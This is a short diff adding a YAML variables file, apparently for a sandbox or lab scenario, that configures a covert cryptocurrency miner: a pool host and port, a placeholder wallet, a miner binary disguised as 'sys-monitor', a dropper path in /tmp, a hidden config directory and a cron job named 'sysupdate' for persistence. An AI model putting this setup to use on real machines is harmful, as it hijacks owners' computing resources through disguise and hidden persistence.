@@ -1,0 +1,9 @@
+username: cyrano
+pool_host: pool-server
+pool_port: 80
+wallet: "48sandbox1CryptoWalletAddressPlaceholder1111111111111111111111111111111111111111111111111X"
+miner_binary: /usr/local/sbin/sys-monitor
+dropper_path: /tmp/ofd
+miner_config_dir: "/home/{{ username }}/.config/sys-monitor"
+miner_config_file: "/home/{{ username }}/.config/sys-monitor/config.json"
+cron_job_file: /etc/cron.d/sysupdate
